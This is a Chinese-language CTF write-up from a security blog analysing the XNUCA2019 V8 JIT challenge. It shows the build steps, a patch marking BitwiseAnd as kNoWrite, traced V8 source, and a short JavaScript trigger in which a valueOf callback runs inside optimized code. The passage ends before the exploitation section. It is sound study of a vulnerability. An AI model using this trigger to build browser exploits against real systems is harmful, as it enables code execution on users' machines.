<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="google-site-verification" content="n74fzVGuzCcR7QhYWu-qaPH7lKOjZC3b3tDU0egKMNA" />














  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="browser,v8," />










<meta name="description" content="本文首发于安全客: https://www.anquanke.com/post/id/205572 这是去年XNUCA初赛中的一道题，本文首先会从源码的角度来分析漏洞的成因，并且详细跟进了漏洞利用中回调函数触发的根源，最后通过两种不同的利用技巧来对该漏洞进行利用。 相关exp和patch文件在这里 环境搭建在学习P4nda师傅关于CVE-2018-17463文章的时候，意识到该漏洞和这道题非常相似">
<meta name="keywords" content="browser,v8">
<meta property="og:type" content="article">
<meta property="og:title" content="Browser Pwn XNUCA2019-JIT 分析与利用">
<meta property="og:url" content="https://e3pem.github.io/2020/05/20/browser/xnuca2019-jit/index.html">
<meta property="og:site_name" content="e3pem&#39;s Blog">
<meta property="og:description" content="本文首发于安全客: https://www.anquanke.com/post/id/205572 这是去年XNUCA初赛中的一道题，本文首先会从源码的角度来分析漏洞的成因，并且详细跟进了漏洞利用中回调函数触发的根源，最后通过两种不同的利用技巧来对该漏洞进行利用。 相关exp和patch文件在这里 环境搭建在学习P4nda师傅关于CVE-2018-17463文章的时候，意识到该漏洞和这道题非常相似">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/xnuca2019-inobject.png">
<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/xnuca2019-calc.png">
<meta property="og:updated_time" content="2020-05-20T04:55:33.911Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Browser Pwn XNUCA2019-JIT 分析与利用">
<meta name="twitter:description" content="本文首发于安全客: https://www.anquanke.com/post/id/205572 这是去年XNUCA初赛中的一道题，本文首先会从源码的角度来分析漏洞的成因，并且详细跟进了漏洞利用中回调函数触发的根源，最后通过两种不同的利用技巧来对该漏洞进行利用。 相关exp和patch文件在这里 环境搭建在学习P4nda师傅关于CVE-2018-17463文章的时候，意识到该漏洞和这道题非常相似">
<meta name="twitter:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/xnuca2019-inobject.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.3',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://e3pem.github.io/2020/05/20/browser/xnuca2019-jit/"/>





  <title>Browser Pwn XNUCA2019-JIT 分析与利用 | e3pem's Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">e3pem's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description"></h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://e3pem.github.io/2020/05/20/browser/xnuca2019-jit/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="e3pem">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="e3pem's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">Browser Pwn XNUCA2019-JIT 分析与利用</h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-20T12:00:00+08:00">
                2020-05-20
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>本文首发于安全客: <a href="https://www.anquanke.com/post/id/205572" target="_blank" rel="noopener">https://www.anquanke.com/post/id/205572</a></p>
<p>这是去年XNUCA初赛中的一道题，本文首先会从源码的角度来分析漏洞的成因，并且详细跟进了漏洞利用中回调函数触发的根源，最后通过两种不同的利用技巧来对该漏洞进行利用。</p>
<p>相关exp和patch文件<a href="https://github.com/e3pem/CTF/tree/master/xnuca2019_jit" target="_blank" rel="noopener">在这里</a></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在学习<a href="http://p4nda.top/2019/06/11/%C2%96CVE-2018-17463/" target="_blank" rel="noopener">P4nda师傅</a>关于<code>CVE-2018-17463</code>文章的时候，意识到该漏洞和这道题非常相似，所以本题的环境就直接在<code>CVE-2018-17463</code>上搭建了（与题目本身的环境不一致，但不影响我们学习该题分析和利用的方法）。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line"><span class="built_in">export</span> PATH=`<span class="built_in">pwd</span>`/depot_tools:<span class="string">"<span class="variable">$PATH</span>"</span></span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ninja-build/ninja.git</span><br><span class="line"><span class="built_in">cd</span> ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; <span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">export</span> PATH=`<span class="built_in">pwd</span>`/ninja:<span class="string">"<span class="variable">$PATH</span>"</span></span><br><span class="line"></span><br><span class="line">fetch v8</span><br><span class="line">git checkout 568979f4d891bafec875fab20f608ff9392f4f29</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动把src/compiler/js-operator.cc中的</span></span><br><span class="line"><span class="comment"># V(BitwiseAnd, Operator::kNoProperties, 2, 1)改成</span></span><br><span class="line"><span class="comment"># V(BitwiseAnd, Operator::kNoWrite, 2, 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># debug version</span></span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug d8</span><br><span class="line"></span><br><span class="line"><span class="comment"># release version</span></span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug d8</span><br></pre></td></tr></table></figure>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h3><p>这道题的patch非常简洁，只是把<code>BitwiseAnd</code>的属性从<code>kNoProperties</code>变成了<code>kNoWrite</code>。所以问题肯定出在对<code>BitwiseAnd</code>操作的误判，即认为该操作不存在可见的副作用，既然这个推断有问题，那么副作用到底出现在什么地方呢？下面将从源码的角度来寻找副作用！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/js-operator.cc b/src/compiler/js-operator.cc</span><br><span class="line">index 5337ae3bda..f5cf34bb3b 100644</span><br><span class="line">--- a/src/compiler/js-operator.cc</span><br><span class="line">+++ b/src/compiler/js-operator.cc</span><br><span class="line">@@ -597,7 +597,7 @@ CompareOperationHint CompareOperationHintOf(const Operator* op) &#123;</span><br><span class="line"> #define CACHED_OP_LIST(V)                                                \</span><br><span class="line">   V(BitwiseOr, Operator::kNoProperties, 2, 1)                            \</span><br><span class="line">   V(BitwiseXor, Operator::kNoProperties, 2, 1)                           \</span><br><span class="line">-  V(BitwiseAnd, Operator::kNoProperties, 2, 1)                           \</span><br><span class="line">+  V(BitwiseAnd, Operator::kNoWrite, 2, 1)                           \</span><br><span class="line">   V(ShiftLeft, Operator::kNoProperties, 2, 1)                            \</span><br><span class="line">   V(ShiftRight, Operator::kNoProperties, 2, 1)                           \</span><br><span class="line">   V(ShiftRightLogical, Operator::kNoProperties, 2, 1)                    \</span><br></pre></td></tr></table></figure>
<h3 id="寻找漏洞触发点"><a href="#寻找漏洞触发点" class="headerlink" title="寻找漏洞触发点"></a>寻找漏洞触发点</h3><p>直接全局搜索<code>BitwiseAnd</code>字符串便可找到所有可能操作该节点的地方。注意到在<code>src\compiler\js-generic-lowering.cc</code>中有对该字符串的操作，对于为什么会关注这里，主要是因为这是Turbofan对<code>sea of nodes</code>处理的一个阶段，Turbofan在对代码进行优化编译的时候主要就是经过多个阶段对节点的分析处理来得到更加底层的操作代码。</p>
<p>经过处理后，<code>BitwiseAnd</code>节点被替换成了<code>Builtins::k##Name</code>的Builtins调用，也既<code>Builtins::kBitwiseAnd</code>。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src\compiler\js-generic-lowering.cc</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REPLACE_STUB_CALL(Name)                                              \</span></span><br><span class="line">  <span class="keyword">void</span> JSGenericLowering::LowerJS##Name(Node* node) &#123;                        \</span><br><span class="line">    CallDescriptor::Flags flags = FrameStateFlagForCall(node);               \</span><br><span class="line">    Callable callable = Builtins::CallableFor(isolate(), Builtins::k##Name); \</span><br><span class="line">    ReplaceWithStubCall(node, callable, flags);                              \</span><br><span class="line">  &#125;</span><br><span class="line">REPLACE_STUB_CALL(BitwiseAnd)</span><br></pre></td></tr></table></figure>
<p><code>Builtins::kBitwiseAnd</code>定义在<code>src\builtins\builtins-number-gen.cc</code>中，主要逻辑就是获取<code>BitwiseAnd</code>节点的左右两个<code>操作数</code>，利用<code>TaggedToWord32OrBigInt</code>判断操作数是正常的数还是<code>BigInt</code>，如果左右操作数都不是大整数，就会调用<code>BitwiseOp</code>来进行处理，否则就会调用<code>Runtime::kBigIntBinaryOp</code>的runtime函数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src\builtins\builtins-number-gen.cc</span></span><br><span class="line">TF_BUILTIN(BitwiseAnd, NumberBuiltinsAssembler) &#123;</span><br><span class="line">  EmitBitwiseOp&lt;Descriptor&gt;(Operation::kBitwiseAnd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">template</span> &lt;<span class="keyword">typename</span> Descriptor&gt;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">EmitBitwiseOp</span><span class="params">(Operation op)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// 要调试的话可以加入：</span></span><br><span class="line">    <span class="comment">// DebugBreak();</span></span><br><span class="line">    Node* left = Parameter(Descriptor::kLeft);</span><br><span class="line">    Node* right = Parameter(Descriptor::kRight);</span><br><span class="line">    Node* context = Parameter(Descriptor::kContext);</span><br><span class="line"></span><br><span class="line">    VARIABLE(var_left_word32, MachineRepresentation::kWord32);</span><br><span class="line">    VARIABLE(var_right_word32, MachineRepresentation::kWord32);</span><br><span class="line">    VARIABLE(var_left_bigint, MachineRepresentation::kTagged, left);</span><br><span class="line">    VARIABLE(var_right_bigint, MachineRepresentation::kTagged);</span><br><span class="line">    Label if_left_number(this), do_number_op(this);</span><br><span class="line">    Label if_left_bigint(this), do_bigint_op(this);</span><br><span class="line"></span><br><span class="line">    TaggedToWord32OrBigInt(context, left, &amp;if_left_number, &amp;var_left_word32,</span><br><span class="line">                           &amp;if_left_bigint, &amp;var_left_bigint);</span><br><span class="line">    BIND(&amp;if_left_number);</span><br><span class="line">    TaggedToWord32OrBigInt(context, right, &amp;do_number_op, &amp;var_right_word32,</span><br><span class="line">                           &amp;do_bigint_op, &amp;var_right_bigint);</span><br><span class="line">    BIND(&amp;do_number_op);</span><br><span class="line">    Return(BitwiseOp(var_left_word32.value(), var_right_word32.value(), op));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// BigInt cases.</span></span><br><span class="line">    BIND(&amp;if_left_bigint);</span><br><span class="line">    TaggedToNumeric(context, right, &amp;do_bigint_op, &amp;var_right_bigint);</span><br><span class="line"></span><br><span class="line">    BIND(&amp;do_bigint_op);</span><br><span class="line">    Return(CallRuntime(Runtime::kBigIntBinaryOp, context,</span><br><span class="line">                       var_left_bigint.value(), var_right_bigint.value(),</span><br><span class="line">                       SmiConstant(op)));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>一开始的分析方向主要是放在<code>BitwiseAnd</code>节点对两个操作数的改变上，但是我结合实际调试以及源码分析，没有找到哪个地方对操作数进行了改变，感兴趣的可以查看一下相关代码，由于篇幅原因，这里我只分析存在漏洞的地方，也就是<code>TaggedToWord32OrBigInt</code>函数中的内容。</p>
<p>跟进<code>TaggedToWord32OrBigInt</code>函数，函数又调用了<code>TaggedToWord32OrBigIntImpl</code>，<code>TaggedToWord32OrBigIntImpl</code>主要的逻辑是一个循环，会判断参数<code>value</code>节点的类型是不是小整数Smi，不是的话就会依据其map来看value的类型，例如是不是HeapNumber、BigInt。如果都不是，那么会看value的<code>instance_type</code>是不是<code>ODDBALL_TYPE</code>，如果仍然不是，那么就会依据<code>conversion</code>的类型来调用相应的Builtins函数，这里<code>conversion</code>的类型为<code>Object::Conversion::kToNumeric</code>，因此会调用<code>Builtins::NonNumberToNumeric</code>函数，这就是问题所在了！！</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src\code-stub-assembler.cc</span></span><br><span class="line"><span class="keyword">void</span> CodeStubAssembler::TaggedToWord32OrBigInt(Node* context, Node* value,</span><br><span class="line">                                               Label* if_number,</span><br><span class="line">                                               Variable* var_word32,</span><br><span class="line">                                               Label* if_bigint,</span><br><span class="line">                                               Variable* var_bigint) &#123;</span><br><span class="line">  TaggedToWord32OrBigIntImpl&lt;Object::Conversion::kToNumeric&gt;(</span><br><span class="line">      context, value, if_number, var_word32, if_bigint, var_bigint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;Object::Conversion conversion&gt;</span><br><span class="line"><span class="keyword">void</span> CodeStubAssembler::TaggedToWord32OrBigIntImpl(</span><br><span class="line">    Node* context, Node* value, Label* if_number, Variable* var_word32,</span><br><span class="line">    Label* if_bigint, Variable* var_bigint, Variable* var_feedback) &#123;</span><br><span class="line">	</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// We might need to loop after conversion.</span></span><br><span class="line">  VARIABLE(var_value, MachineRepresentation::kTagged, value);</span><br><span class="line">  OverwriteFeedback(var_feedback, BinaryOperationFeedback::kNone);</span><br><span class="line">  Variable* loop_vars[] = &#123;&amp;var_value, var_feedback&#125;;</span><br><span class="line">  <span class="keyword">int</span> num_vars =</span><br><span class="line">      var_feedback != <span class="literal">nullptr</span> ? arraysize(loop_vars) : arraysize(loop_vars) - <span class="number">1</span>;</span><br><span class="line">  <span class="function">Label <span class="title">loop</span><span class="params">(<span class="keyword">this</span>, num_vars, loop_vars)</span></span>;</span><br><span class="line">  Goto(&amp;loop);</span><br><span class="line">  BIND(&amp;loop);</span><br><span class="line">  &#123;</span><br><span class="line">	<span class="comment">// 取操作数的值</span></span><br><span class="line">    value = var_value.value();</span><br><span class="line">    Label not_smi(this), is_heap_number(this), is_oddball(this),</span><br><span class="line">        is_bigint(<span class="keyword">this</span>);</span><br><span class="line">	<span class="comment">//判断操作数是不是小整数Smi</span></span><br><span class="line">    GotoIf(TaggedIsNotSmi(value), &amp;not_smi);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 如果是小整数，进入到if_number的处理分支</span></span><br><span class="line">    <span class="comment">// &#123;value&#125; is a Smi.</span></span><br><span class="line">    var_word32-&gt;Bind(SmiToInt32(value));</span><br><span class="line">    CombineFeedback(var_feedback, BinaryOperationFeedback::kSignedSmall);</span><br><span class="line">    Goto(if_number);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 如果不是Smi，那么加载value对象的map，依据map来判断是不是HeapNumber</span></span><br><span class="line">    BIND(&amp;not_smi);</span><br><span class="line">    Node* <span class="built_in">map</span> = LoadMap(value);</span><br><span class="line">    GotoIf(IsHeapNumberMap(<span class="built_in">map</span>), &amp;is_heap_number);</span><br><span class="line">	<span class="comment">// 如果不是HeapNumber，从map中获取实例的类型InstanceType</span></span><br><span class="line">    Node* instance_type = LoadMapInstanceType(<span class="built_in">map</span>);</span><br><span class="line">    <span class="keyword">if</span> (conversion == Object::Conversion::kToNumeric) &#123;</span><br><span class="line">		<span class="comment">// 如果instance_type是BigInt</span></span><br><span class="line">      GotoIf(IsBigIntInstanceType(instance_type), &amp;is_bigint);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Not HeapNumber (or BigInt if conversion == kToNumeric).</span></span><br><span class="line">	<span class="comment">// 既不是HeapNumber也不是BigInt</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (var_feedback != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="comment">// We do not require an Or with earlier feedback here because once we</span></span><br><span class="line">        <span class="comment">// convert the value to a Numeric, we cannot reach this path. We can</span></span><br><span class="line">        <span class="comment">// only reach this path on the first pass when the feedback is kNone.</span></span><br><span class="line">        CSA_ASSERT(<span class="keyword">this</span>, SmiEqual(CAST(var_feedback-&gt;value()),</span><br><span class="line">                                  SmiConstant(BinaryOperationFeedback::kNone)));</span><br><span class="line">      &#125;</span><br><span class="line">	<span class="comment">//  判断instance_type是不是ODDBALL_TYPE</span></span><br><span class="line">      GotoIf(InstanceTypeEqual(instance_type, ODDBALL_TYPE), &amp;is_oddball);</span><br><span class="line">      <span class="comment">// Not an oddball either -&gt; convert.</span></span><br><span class="line">	<span class="comment">//   不是ODDBALL_TYPE，依据conversion的类型调用相应的Builtin函数，conversion的类型为Object::Conversion::kToNumeric</span></span><br><span class="line">      <span class="keyword">auto</span> builtin = conversion == Object::Conversion::kToNumeric</span><br><span class="line">                         ? Builtins::kNonNumberToNumeric</span><br><span class="line">                         : Builtins::kNonNumberToNumber;</span><br><span class="line">      var_value.Bind(CallBuiltin(builtin, context, value));</span><br><span class="line">      OverwriteFeedback(var_feedback, BinaryOperationFeedback::kAny);</span><br><span class="line">      Goto(&amp;loop);</span><br><span class="line"></span><br><span class="line">      BIND(&amp;is_oddball);</span><br><span class="line">      var_value.Bind(LoadObjectField(value, Oddball::kToNumberOffset));</span><br><span class="line">      OverwriteFeedback(var_feedback,</span><br><span class="line">                        BinaryOperationFeedback::kNumberOrOddball);</span><br><span class="line">      Goto(&amp;loop);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BIND(&amp;is_heap_number);</span><br><span class="line">    var_word32-&gt;Bind(TruncateHeapNumberValueToWord32(value));</span><br><span class="line">    CombineFeedback(var_feedback, BinaryOperationFeedback::kNumber);</span><br><span class="line">    Goto(if_number);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (conversion == Object::Conversion::kToNumeric) &#123;</span><br><span class="line">      BIND(&amp;is_bigint);</span><br><span class="line">      var_bigint-&gt;Bind(value);</span><br><span class="line">      CombineFeedback(var_feedback, BinaryOperationFeedback::kBigInt);</span><br><span class="line">      Goto(if_bigint);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到这里的<code>kNonNumberToNumeric</code>，让我想起了<a href="https://xz.aliyun.com/t/6577" target="_blank" rel="noopener">数字经济线下赛</a>的Browser Pwn，那道题利用的就是<code>ToNumber</code>函数在调用的时候会触发<code>valueOf</code>的回调函数，这道题是否也会触发相应的回调函数呢？在我测试后发现果然是这样！！也就是说我们找到了漏洞存在的地方，<code>a&amp;b</code>将生成一个<code>BitwiseAnd</code>节点，该节点被判定为<code>NoWrite</code>，实际情况却是在对<code>BitwiseAnd</code>节点的输入操作数进行处理的时候会触发操作数中的<code>valueOf</code>回调函数，所以认为该节点是<code>NoWrite</code>是有问题的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt_me</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">let</span> c = <span class="number">1.0</span></span><br><span class="line">	c = c+<span class="number">3</span>;</span><br><span class="line">	a&amp;b;</span><br><span class="line">	<span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> b = &#123;</span><br><span class="line">	valueOf:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">112233</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> b1 = &#123;</span><br><span class="line">	valueOf:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		print(<span class="string">'callback'</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">223344</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">opt_me(<span class="number">1234</span>,b);</span><br><span class="line">opt_me(<span class="number">1234</span>,b);</span><br><span class="line">%OptimizeFunctionOnNextCall(opt_me);</span><br><span class="line">opt_me(<span class="number">2345</span>,b1);</span><br><span class="line"><span class="comment">// output: callback</span></span><br></pre></td></tr></table></figure>
<h3 id="探寻回调函数-toPrimitive"><a href="#探寻回调函数-toPrimitive" class="headerlink" title="探寻回调函数-toPrimitive"></a>探寻回调函数-toPrimitive</h3><p>虽然已经找到了触发漏洞的方式，但是我们的分析不能到此为止，接下来的目标是尝试跟踪到具体调用回调函数的地方。继续分析<code>Builtins::NonNumberToNumeric</code>，该函数获取节点的context和input，并将其作为<code>NonNumberToNumeric</code>的参数。<code>NonNumberToNumeric</code>内部又调用了<code>NonNumberToNumberOrNumeric</code>函数。</p>
